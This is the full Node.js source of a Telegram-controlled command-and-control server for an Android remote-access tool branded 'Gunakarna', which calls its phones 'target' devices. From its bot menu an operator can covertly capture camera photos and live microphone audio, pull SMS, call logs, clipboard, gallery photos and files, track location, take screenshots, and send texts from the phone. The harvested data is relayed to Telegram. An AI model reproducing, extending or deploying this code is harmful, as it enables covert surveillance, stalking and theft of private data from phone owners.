// index.js – Telegram + WebSocket "Gunakarna" device manager
// -----------------------------------------------------------
require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const WebSocket = require("ws");
const http = require("http");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const os = require("os");
const path = require("path");

// ============================================================
// CONFIGURATION  (loaded from .env)
// ============================================================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ALLOWED_CHAT_ID = Number(process.env.ALLOWED_CHAT_ID);
const PORT = Number(process.env.PORT) || 3001;

if (!TELEGRAM_TOKEN || !ALLOWED_CHAT_ID) {
    console.error("[!] Missing TELEGRAM_TOKEN or ALLOWED_CHAT_ID in .env");
    process.exit(1);
}

const MAX_TEXT = 4096;
const CMD_TIMEOUT = 90_000;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// uuid -> device info
const appClients = new Map();
// reqId -> { chatId, type, command, device, caption, filename, format }
const pending = new Map();
// chatId -> { type, uuid }
const waiting = new Map();

console.log("[*] Telegram bot started");
console.log(
    `[*] Server will listen on port ${PORT} (mapped to external port 80)`,
);

// ============================================================
// HELPERS
// ============================================================
function escapeHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
}

function authorized(chatId) {
    return Number(chatId) === ALLOWED_CHAT_ID;
}

function getDevice(uuid) {
    return appClients.get(uuid);
}

function findDeviceByWs(ws) {
    for (const device of appClients.values()) {
        if (device.ws === ws) return device;
    }
    return null;
}

async function sendText(chatId, text, options = {}) {
    const chunks = [];
    for (let i = 0; i < text.length; i += MAX_TEXT) {
        chunks.push(text.slice(i, i + MAX_TEXT));
    }
    for (let i = 0; i < chunks.length; i++) {
        const chunk =
            chunks.length > 1 && i > 0
                ? `[${i + 1}/${chunks.length}]\n${chunks[i]}`
                : chunks[i];
        await bot.sendMessage(chatId, chunk, options);
    }
}

function sendCommand(device, command, args, type, extra = {}) {
    const reqId = uuidv4();
    pending.set(reqId, {
        chatId: extra.chatId,
        type,
        command,
        device,
        caption: extra.caption,
        filename: extra.filename,
        format: extra.format,
    });
    const payload = JSON.stringify(args || {});
    device.ws.send(`CMD|${device.uuid}|${reqId}|${command}|${payload}`);
    console.log(`[CMD] ${device.model} -> ${command}`);

    setTimeout(() => {
        if (pending.has(reqId)) {
            pending.delete(reqId);
            bot.sendMessage(
                extra.chatId,
                `⏱ No response from ${device.model} (${command})`,
            ).catch(() => {});
        }
    }, CMD_TIMEOUT);
}

function fmtSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
    return (bytes / 1048576).toFixed(1) + " MB";
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ============================================================
// RESPONSE HANDLING
// ============================================================
async function handleResp(uuid, reqId, command, payloadRaw) {
    const device = getDevice(uuid);
    if (!device) return;

    let payload = {};
    try {
        payload = JSON.parse(payloadRaw || "{}");
    } catch {
        payload = { raw: payloadRaw };
    }

    if (command === "mic_chunk" && payload.audio) {
        const file = path.join(os.tmpdir(), `mic_${Date.now()}.m4a`);
        fs.writeFileSync(file, Buffer.from(payload.audio, "base64"));
        try {
            const chatId = device.lastChatId || ALLOWED_CHAT_ID;
            await bot.sendAudio(chatId, file, {
                caption: `🎙️ ${device.model} • ${new Date().toLocaleTimeString()}`,
            });
        } catch (e) {
            console.error("[MIC] send error:", e.message);
        } finally {
            try {
                fs.unlinkSync(file);
            } catch (ignored) {}
        }
        return;
    }

    const p = pending.get(reqId);
    if (!p) {
        console.log(`[RESP] unhandled ${command} from ${device.model}`);
        return;
    }
    pending.delete(reqId);
    const chatId = p.chatId;

    try {
        switch (p.type) {
            case "text":
            case "ack":
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                await sendText(
                    chatId,
                    p.format ? p.format(payload) : JSON.stringify(payload),
                    { parse_mode: "HTML" },
                );
                break;

            case "photo": {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                const buf = Buffer.from(payload.image, "base64");
                if (buf.length > 10_000_000) {
                    await bot.sendDocument(chatId, buf, {
                        filename: "capture.jpg",
                        caption: p.caption,
                    });
                } else {
                    await bot.sendPhoto(chatId, buf, { caption: p.caption });
                }
                break;
            }

            case "document": {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                let buf;
                if (payload.data) {
                    buf = Buffer.from(payload.data, "base64");
                } else if (payload.text) {
                    buf = Buffer.from(payload.text, "utf8");
                } else {
                    break;
                }
                await bot.sendDocument(chatId, buf, { filename: p.filename });
                break;
            }

            case "location": {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                await bot.sendLocation(chatId, payload.lat, payload.lon);
                await bot.sendMessage(
                    chatId,
                    `📍 <b>${escapeHtml(device.model)}</b>\n` +
                        `🌐 ${payload.lat}, ${payload.lon}\n` +
                        `🎯 ±${payload.accuracy}m\n\n` +
                        `https://maps.google.com/?q=${payload.lat},${payload.lon}`,
                    { parse_mode: "HTML" },
                );
                break;
            }

            case "gallery":
                await streamGallery(device, chatId, payload);
                break;

            case "file":
                await handleFileResp(chatId, payload, device);
                break;
        }
    } catch (e) {
        console.error("[RESP] send error:", e.message);
    }
}

async function streamGallery(device, chatId, payload) {
    if (payload.error) {
        await bot.sendMessage(chatId, `🔴 ${payload.error}`);
        return;
    }
    const paths = payload.paths || [];
    if (paths.length === 0) {
        await bot.sendMessage(chatId, "🖼️ Gallery is empty.");
        return;
    }
    const batch = paths.slice(0, 10);
    await bot.sendMessage(
        chatId,
        `🖼️ Streaming ${batch.length} images from ${device.model}...`,
    );
    for (let i = 0; i < batch.length; i++) {
        sendCommand(device, "gallery_get", { path: batch[i] }, "photo", {
            chatId,
            caption: `🖼️ ${device.model} • ${i + 1}/${batch.length}`,
        });
        await sleep(900);
    }
}

async function handleFileResp(chatId, payload, device) {
    if (payload.error) {
        await bot.sendMessage(chatId, `🔴 ${payload.error}`);
        return;
    }

    if (payload.files) {
        const list = payload.files;
        if (list.length === 0) {
            await bot.sendMessage(
                chatId,
                `📁 ${escapeHtml(payload.path)} — empty folder.`,
            );
            return;
        }
        const lines = list.map(
            (f, i) =>
                `${i + 1}. ${f.dir ? "📂" : "📄"} ${escapeHtml(f.name)}${
                    f.dir ? "/" : " • " + fmtSize(f.size)
                }`,
        );
        await sendText(
            chatId,
            `📁 <b>${escapeHtml(payload.path)}</b>\n\n${lines.join("\n")}`,
            { parse_mode: "HTML" },
        );
        await bot.sendMessage(
            chatId,
            `Reply with a subfolder path to open it, or a file path to download it.`,
            {
                reply_markup: {
                    force_reply: true,
                    input_field_placeholder: payload.path,
                },
            },
        );
        return;
    }

    if (payload.data) {
        const buf = Buffer.from(payload.data, "base64");
        await bot.sendDocument(chatId, buf, {
            filename: payload.name || "file",
        });
    }
}

// ============================================================
// RESPONSE FORMATTERS
// ============================================================
function fmtInfo(d) {
    return (
        "╭────────────────────────────╮\n" +
        "│   📱 <b>DEVICE INFO</b>      │\n" +
        "╰────────────────────────────╯\n\n" +
        `📱 Model: <b>${escapeHtml(d.model)}</b>\n` +
        `🏷️ Brand: ${escapeHtml(d.brand || "?")}\n` +
        `🆔 Android ID: <code>${escapeHtml(d.androidId || "?")}</code>\n` +
        `🤖 Android: ${escapeHtml(d.version)} (SDK ${escapeHtml(d.sdk)})\n` +
        `🔋 Battery: ${escapeHtml(d.battery)} • ${escapeHtml(d.charging)}\n` +
        `📶 Network: ${escapeHtml(d.network)}\n` +
        `📡 Provider: ${escapeHtml(d.provider)}\n` +
        `💡 Brightness: ${escapeHtml(d.brightness)}\n` +
        `🖥️ Screen: ${d.screenOn ? "ON 🟢" : "OFF ⚫"}\n` +
        `🌐 Locale: ${escapeHtml(d.locale)}`
    );
}

function fmtRealtime(d) {
    return (
        "📊 <b>REAL-TIME</b>\n\n" +
        `📱 ${escapeHtml(d.model)}\n` +
        `🔋 Battery: ${escapeHtml(d.battery)} • ${escapeHtml(d.charging)}\n` +
        `📶 Network: ${escapeHtml(d.network)}\n` +
        `💡 Brightness: ${escapeHtml(d.brightness)}\n` +
        `🖥️ Screen: ${d.screenOn ? "ON 🟢" : "OFF ⚫"}\n` +
        `🌐 Locale: ${escapeHtml(d.locale)}`
    );
}

function fmtSecurity(d) {
    return (
        "🛡️ <b>SECURITY</b>\n\n" +
        `🔒 Lock screen: ${d.lockEnabled ? "ENABLED" : "DISABLED"}\n` +
        `⚡ Root detected: ${d.rootDetected ? "YES ⚠️" : "NO"}\n` +
        `🔌 ADB enabled: ${d.adbEnabled ? "YES" : "NO"}`
    );
}

function fmtApps(arr) {
    if (arr.length === 0) return "📦 No apps found.";
    const lines = arr
        .slice(0, 60)
        .map(
            (a, i) =>
                `${i + 1}. ${escapeHtml(a.label)} <code>${escapeHtml(a.pkg)}</code>${
                    a.system ? " [system]" : ""
                }`,
        );
    return `📦 <b>APPS (${arr.length})</b>\n\n${lines.join("\n")}`;
}

function fmtAck(d) {
    if (d.error) return `🔴 ${d.error}`;
    if (d.stream) {
        const icons = {
            media: "🎵",
            notification: "🔔",
            alarm: "⏰",
            ring: "📞",
        };
        return `${icons[d.stream] || "🔊"} <b>${d.stream.toUpperCase()}</b>: ${d.level}/${d.max}`;
    }
    return "✅ Done.";
}

// ============================================================
// KEYBOARDS
// ============================================================
function getPersistentTriggerButton() {
    return {
        keyboard: [[{ text: "😈 Gunakarna 😈" }]],
        resize_keyboard: true,
        one_time_keyboard: false,
    };
}

function deviceControlKeyboard(uuid) {
    const device = getDevice(uuid);
    const micLabel = device && device.micOn ? "🎙️ Mic: ON 🔴" : "🎙️ Mic: OFF";
    const vibLabel =
        device && device.vibrateOn ? "📳 Vibrate: ON" : "📳 Vibrate: OFF";
    return {
        inline_keyboard: [
            [
                { text: "📱 Info", callback_data: `device_info:${uuid}` },
                { text: "📊 Real-time", callback_data: `realtime:${uuid}` },
            ],
            [
                { text: "🛡️ Security", callback_data: `security:${uuid}` },
                { text: "📦 Apps", callback_data: `apps:${uuid}` },
            ],
            [
                { text: "📷 Camera", callback_data: `camera:${uuid}` },
                { text: micLabel, callback_data: `mic:${uuid}` },
            ],
            [
                { text: "🖼️ Gallery", callback_data: `gallery:${uuid}` },
                { text: "🔎 Browser", callback_data: `browser:${uuid}` },
            ],
            [
                { text: "🖥️ Screenshot", callback_data: `screenshot:${uuid}` },
                { text: "📍 Location", callback_data: `location:${uuid}` },
            ],
            [
                { text: "🔔 Notify", callback_data: `notify:${uuid}` },
                { text: vibLabel, callback_data: `vibrate:${uuid}` },
            ],
            [
                { text: "📁 Files", callback_data: `files:${uuid}` },
                { text: "📋 Clipboard", callback_data: `clipboard:${uuid}` },
            ],
            [
                { text: "📞 Calls", callback_data: `calls:${uuid}` },
                { text: "⚙️ Settings", callback_data: `settings:${uuid}` },
            ],
            [
                { text: "✉️ SMS Inbox", callback_data: `sms_received:${uuid}` },
                { text: "✉️ SMS Send", callback_data: `sms_send:${uuid}` },
            ],
            [{ text: "🔙 Devices", callback_data: "gunakarna" }],
        ],
    };
}

function cameraKeyboard(uuid) {
    return {
        inline_keyboard: [
            [
                {
                    text: "📷 Front Camera",
                    callback_data: `camera_front:${uuid}`,
                },
            ],
            [{ text: "📷 Back Camera", callback_data: `camera_back:${uuid}` }],
            [{ text: "🔙 Device Control", callback_data: `device:${uuid}` }],
        ],
    };
}

function settingsKeyboard(uuid) {
    const row = (label, stream) => [
        { text: `${label} ➕`, callback_data: `audio:${uuid}:${stream}:1` },
        { text: `${label} ➖`, callback_data: `audio:${uuid}:${stream}:-1` },
    ];
    return {
        inline_keyboard: [
            row("🔊 Volume", "media"),
            row("🎵 Media", "media"),
            row("🔔 Notification", "notification"),
            row("⏰ Alarm", "alarm"),
            row("📞 Ring", "ring"),
            [{ text: "🔙 Device Control", callback_data: `device:${uuid}` }],
        ],
    };
}

// ============================================================
// DEVICE LIST
// ============================================================
async function showGunakarna(chatId, messageId = null) {
    if (appClients.size === 0) {
        const text =
            "╭────────────────────────────╮\n" +
            "│   😈 <b>GUNAKARNA</b>          │\n" +
            "╰────────────────────────────╯\n\n" +
            "🔴 <b>No devices online</b>\n\n" +
            "Waiting for an authorized device...";
        const options = {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Refresh", callback_data: "gunakarna" }],
                ],
            },
        };
        if (messageId) {
            try {
                return await bot.editMessageText(text, options);
            } catch {
                return;
            }
        }
        return bot.sendMessage(chatId, text, {
            parse_mode: "HTML",
            reply_markup: options.reply_markup,
        });
    }

    const buttons = [];
    let index = 1;
    for (const [uuid, device] of appClients) {
        buttons.push([
            {
                text: `📱 ${index}. ${device.model} 🟢`,
                callback_data: `device:${uuid}`,
            },
        ]);
        index++;
    }
    buttons.push([{ text: "🔄 Refresh Devices", callback_data: "gunakarna" }]);

    const text =
        "╭────────────────────────────╮\n" +
        "│   😈 <b>GUNAKARNA</b> 😈 Nexus  ❤️‍🔥│" +
        "╰────────────────────────────╯\n\n" +
        `🟢 Online: <b>${appClients.size}</b>\n\n` +
        "<b>CONNECTED DEVICES</b>\n\n" +
        "Select a device:";
    const options = {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons },
    };

    if (messageId) {
        try {
            return await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: messageId,
                ...options,
            });
        } catch {
            return;
        }
    }
    return bot.sendMessage(chatId, text, options);
}

// ============================================================
// HTTP SERVER (serves status HTML page + WebSocket upgrade)
// ============================================================
const server = http.createServer((req, res) => {
    // Status page → HTML with <h1> tag
    if (req.url === "/status" || req.url === "/") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gunakarna Server</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 48px 64px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 3rem;
            color: #00ff88;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            margin-bottom: 12px;
            letter-spacing: 2px;
        }
        .subtitle {
            color: rgba(255, 255, 255, 0.6);
            font-size: 1.1rem;
            margin-bottom: 24px;
        }
        .status-dot {
            display: inline-block;
            width: 14px;
            height: 14px;
            background: #00ff88;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }
        .stats {
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.85rem;
            margin-top: 20px;
        }
        .badge {
            display: inline-block;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.2);
            color: #00ff88;
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="status-dot"></div>
        <h1>Karna Server Running</h1>
        <p class="subtitle">Gunakarna Device Manager</p>
        <div class="badge">🟢 Online &bull; ${appClients.size} device${appClients.size !== 1 ? "s" : ""} connected</div>
        <div class="stats">Uptime: ${Math.round(process.uptime())}s</div>
    </div>
</body>
</html>
        `);
    } else {
        res.writeHead(404);
        res.end();
    }
});

// ============================================================
// WEB SOCKET SERVER  (attached to the same HTTP server)
// ============================================================
const wss = new WebSocket.Server({ server });

wss.on("connection", (ws) => {
    const connectionUuid = uuidv4();
    console.log(`[+] WebSocket connection: ${connectionUuid}`);

    ws.on("message", (data) => {
        const message = data.toString();

        if (message.startsWith("AUTH|")) {
            const parts = message.split("|");
            const uuid = parts[1] || connectionUuid;
            let info = {};
            try {
                info = JSON.parse(parts.slice(2).join("|") || "{}");
            } catch {
                console.log("[!] Invalid AUTH JSON");
            }
            const existing = appClients.get(uuid);

            appClients.set(uuid, {
                ws,
                uuid,
                model: info.model || existing?.model || "Unknown device",
                battery: info.battery || existing?.battery || "Unknown",
                version: info.version || existing?.version || "Unknown",
                sdk: info.sdk || existing?.sdk || "Unknown",
                brightness:
                    info.brightness || existing?.brightness || "Unknown",
                provider:
                    info.provider || existing?.provider || "Not available",
                network: info.network || existing?.network || "Unknown",
                charging: info.charging || existing?.charging || "Unknown",
                micOn: existing?.micOn || false,
                vibrateOn: existing?.vibrateOn || false,
                lastChatId: existing?.lastChatId,
                connectedAt: existing?.connectedAt || Date.now(),
            });
            ws.uuid = uuid;
            console.log(`[+] Authorized: ${info.model || "Unknown"} (${uuid})`);

            if (!existing) {
                bot.sendMessage(
                    ALLOWED_CHAT_ID,
                    `🟢 <b>Device connected</b>\n📱 ${info.model || "Unknown"}\n🔗 ${uuid}`,
                    { parse_mode: "HTML" },
                ).catch(() => {});
            }
            return;
        }

        if (message === "PONG") return;

        if (message.startsWith("RESP|")) {
            const parts = message.split("|");
            const uuid = parts[1];
            const reqId = parts[2];
            const command = parts[3];
            const payload = parts.slice(4).join("|");
            console.log(`[RESP] ${uuid} -> ${command}`);
            handleResp(uuid, reqId, command, payload);
            return;
        }
    });

    ws.on("close", () => {
        const device = findDeviceByWs(ws);
        if (!device) return;
        console.log(`[-] Disconnected: ${device.model} (${device.uuid})`);
        appClients.delete(device.uuid);
        bot.sendMessage(
            ALLOWED_CHAT_ID,
            `🔴 <b>Device disconnected</b>\n📱 ${device.model}\n🔗 ${device.uuid}`,
            { parse_mode: "HTML", reply_markup: getPersistentTriggerButton() },
        ).catch(() => {});
    });
});

// ============================================================
// TELEGRAM: /start
// ============================================================
bot.onText(/^\/start$/, async (msg) => {
    const chatId = msg.chat.id;
    if (!authorized(chatId)) {
        return bot.sendMessage(chatId, "⛔ Permission denied.");
    }
    await bot.sendMessage(
        chatId,
        "╭────────────────────────────╮\n" +
            "│   😈 <b>GUNAKARNA</b>          │\n" +
            "╰────────────────────────────╯\n\n" +
            "Device Manager\n\n" +
            "Press the button below:",
        { parse_mode: "HTML", reply_markup: getPersistentTriggerButton() },
    );
});

// ============================================================
// TELEGRAM: force‑reply inputs & trigger button
// ============================================================
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    if (!authorized(chatId)) return;
    if (!msg.text || msg.text.startsWith("/")) return;

    // Trigger button → show device menu
    if (msg.text === "😈 Gunakarna 😈") {
        return showGunakarna(chatId);
    }

    if (waiting.has(chatId)) {
        const w = waiting.get(chatId);
        waiting.delete(chatId);
        const device = getDevice(w.uuid);
        if (!device) return bot.sendMessage(chatId, "🔴 Device offline.");
        const input = msg.text.trim();

        switch (w.type) {
            case "files":
                sendCommand(device, "files", { path: input }, "file", {
                    chatId,
                });
                break;

            case "sms_send": {
                const idx = input.indexOf("|");
                if (idx < 0) {
                    return bot.sendMessage(
                        chatId,
                        "⚠️ Format: <code>number|message</code>\n" +
                            "Example: <code>+919876543210|Hello</code>",
                        { parse_mode: "HTML" },
                    );
                }
                sendCommand(
                    device,
                    "sms_send",
                    {
                        number: input.slice(0, idx).trim(),
                        text: input.slice(idx + 1).trim(),
                    },
                    "ack",
                    { chatId, format: fmtAck },
                );
                break;
            }

            case "browser":
                sendCommand(device, "browser", { url: input }, "ack", {
                    chatId,
                    format: fmtAck,
                });
                break;

            case "notify": {
                const idx = input.indexOf("|");
                const title =
                    idx < 0 ? "Gunakarna" : input.slice(0, idx).trim();
                const text = idx < 0 ? input : input.slice(idx + 1).trim();
                sendCommand(device, "notify", { title, text }, "ack", {
                    chatId,
                    format: fmtAck,
                });
                break;
            }
        }
    }
});

// ============================================================
// TELEGRAM: callback handler
// ============================================================
bot.on("callback_query", async (query) => {
    const msg = query.message;
    if (!msg) return;
    const chatId = msg.chat.id;
    const data = query.data || "";

    if (!authorized(chatId)) {
        return bot.answerCallbackQuery(query.id, {
            text: "Permission denied.",
        });
    }
    await bot.answerCallbackQuery(query.id);

    if (data === "gunakarna") {
        return showGunakarna(chatId, msg.message_id);
    }

    if (data.startsWith("device:")) {
        const uuid = data.substring("device:".length);
        const device = getDevice(uuid);
        if (!device) return bot.sendMessage(chatId, "🔴 Device disconnected.");
        device.lastChatId = chatId;

        const text =
            "╭────────────────────────────╮\n" +
            "│  😈 <b>GUNAKARNA CONTROL</b>  │\n" +
            "╰────────────────────────────╯\n\n" +
            `📱 <b>${escapeHtml(device.model)}</b>\n` +
            "🟢 Online  •  🔐 Authorized\n" +
            `Android ${escapeHtml(device.version)}\n` +
            `🔋 ${escapeHtml(device.battery)}  •  📶 ${escapeHtml(device.provider)}\n\n` +
            "<i>Developed by Gunakarna</i>";

        return bot.editMessageText(text, {
            chat_id: chatId,
            message_id: msg.message_id,
            parse_mode: "HTML",
            reply_markup: deviceControlKeyboard(uuid),
        });
    }

    const parts = data.split(":");
    const cmd = parts[0];
    const uuid = parts[1];
    const device = getDevice(uuid);

    if (!device) return bot.sendMessage(chatId, "🔴 Device disconnected.");
    device.lastChatId = chatId;

    switch (cmd) {
        case "device_info":
            return sendCommand(device, "info", {}, "text", {
                chatId,
                format: fmtInfo,
            });
        case "realtime":
            return sendCommand(device, "realtime", {}, "text", {
                chatId,
                format: fmtRealtime,
            });
        case "security":
            return sendCommand(device, "security", {}, "text", {
                chatId,
                format: fmtSecurity,
            });
        case "apps":
            return sendCommand(device, "apps", {}, "text", {
                chatId,
                format: fmtApps,
            });
        case "camera":
            return bot.editMessageText(
                "╭────────────────────────────╮\n" +
                    "│       <b>📷 CAMERA</b>        │\n" +
                    "╰────────────────────────────╯\n\n" +
                    `📱 <b>${escapeHtml(device.model)}</b>\n\n` +
                    "Choose a camera.",
                {
                    chat_id: chatId,
                    message_id: msg.message_id,
                    parse_mode: "HTML",
                    reply_markup: cameraKeyboard(uuid),
                },
            );
        case "camera_front":
            return sendCommand(device, "camera_front", {}, "photo", {
                chatId,
                caption: `📷 ${device.model} • Front`,
            });
        case "camera_back":
            return sendCommand(device, "camera_back", {}, "photo", {
                chatId,
                caption: `📷 ${device.model} • Back`,
            });
        case "mic": {
            if (device.micOn) {
                sendCommand(device, "mic_off", {}, "ack", {
                    chatId,
                    format: fmtAck,
                });
                device.micOn = false;
            } else {
                sendCommand(device, "mic_on", {}, "ack", {
                    chatId,
                    format: fmtAck,
                });
                device.micOn = true;
            }
            await sleep(400);
            return bot
                .editMessageReplyMarkup(deviceControlKeyboard(uuid), {
                    chat_id: chatId,
                    message_id: msg.message_id,
                })
                .catch(() => {});
        }
        case "vibrate": {
            if (device.vibrateOn) {
                sendCommand(device, "vibrate_off", {}, "ack", {
                    chatId,
                    format: fmtAck,
                });
                device.vibrateOn = false;
            } else {
                sendCommand(device, "vibrate_on", {}, "ack", {
                    chatId,
                    format: fmtAck,
                });
                device.vibrateOn = true;
            }
            await sleep(400);
            return bot
                .editMessageReplyMarkup(deviceControlKeyboard(uuid), {
                    chat_id: chatId,
                    message_id: msg.message_id,
                })
                .catch(() => {});
        }
        case "gallery":
            return sendCommand(device, "gallery", {}, "gallery", { chatId });
        case "browser":
            return bot
                .sendMessage(
                    chatId,
                    "🔎 Enter URL to open on the target device:",
                    {
                        reply_markup: {
                            force_reply: true,
                            input_field_placeholder: "https://example.com",
                        },
                    },
                )
                .then(() => waiting.set(chatId, { type: "browser", uuid }));
        case "screenshot":
            return sendCommand(device, "screenshot", {}, "photo", {
                chatId,
                caption: `🖥️ ${device.model} • Screenshot`,
            });
        case "location":
            return sendCommand(device, "location", {}, "location", { chatId });
        case "notify":
            return bot
                .sendMessage(chatId, "🔔 Enter <code>title|message</code>:", {
                    parse_mode: "HTML",
                    reply_markup: {
                        force_reply: true,
                        input_field_placeholder: "Hello|Test",
                    },
                })
                .then(() => waiting.set(chatId, { type: "notify", uuid }));
        case "files":
            return bot
                .sendMessage(chatId, "📁 Enter folder or file path:", {
                    reply_markup: {
                        force_reply: true,
                        input_field_placeholder: "/storage/emulated/0/Download",
                    },
                })
                .then(() => waiting.set(chatId, { type: "files", uuid }));
        case "clipboard":
            return sendCommand(device, "clipboard", {}, "text", {
                chatId,
                format: (d) =>
                    `📋 <b>CLIPBOARD</b>\n\n${d.text ? escapeHtml(d.text) : "(empty)"}`,
            });
        case "calls":
            return sendCommand(device, "calls", {}, "document", {
                chatId,
                filename: `calls_${device.model}_${Date.now()}.txt`,
            });
        case "sms_received":
            return sendCommand(device, "sms_inbox", {}, "document", {
                chatId,
                filename: `sms_${device.model}_${Date.now()}.txt`,
            });
        case "sms_send":
            return bot
                .sendMessage(
                    chatId,
                    "✉️ Enter <code>number|message</code>:\n" +
                        "Example: <code>+919876543210|Hello</code>",
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            force_reply: true,
                            input_field_placeholder: "+91...|Hi",
                        },
                    },
                )
                .then(() => waiting.set(chatId, { type: "sms_send", uuid }));
        case "settings":
            return bot.editMessageText(
                `⚙️ <b>SETTINGS</b>\n\n📱 ${escapeHtml(device.model)}\n\nAdjust volume:`,
                {
                    chat_id: chatId,
                    message_id: msg.message_id,
                    parse_mode: "HTML",
                    reply_markup: settingsKeyboard(uuid),
                },
            );
        case "audio": {
            const stream = parts[2];
            const delta = parseInt(parts[3], 10) || 0;
            return sendCommand(device, "audio_set", { stream, delta }, "ack", {
                chatId,
                format: fmtAck,
            });
        }
    }
});

// ============================================================
// START SERVER
// ============================================================
server.listen(PORT, "0.0.0.0", () => {
    console.log(
        `[*] Server running on port ${PORT} (mapped to external port 80)`,
    );
    console.log(
        `[*] Status page: https://${process.env.REPL_SLUG || "your-app"}.${process.env.REPL_OWNER || "repl"}.replit.dev/`,
    );
    console.log(
        `[*] WebSocket: wss://${process.env.REPL_SLUG || "your-app"}.${process.env.REPL_OWNER || "repl"}.replit.dev/`,
    );
    console.log("[*] Bot ready. Press Ctrl+C to stop.");
});
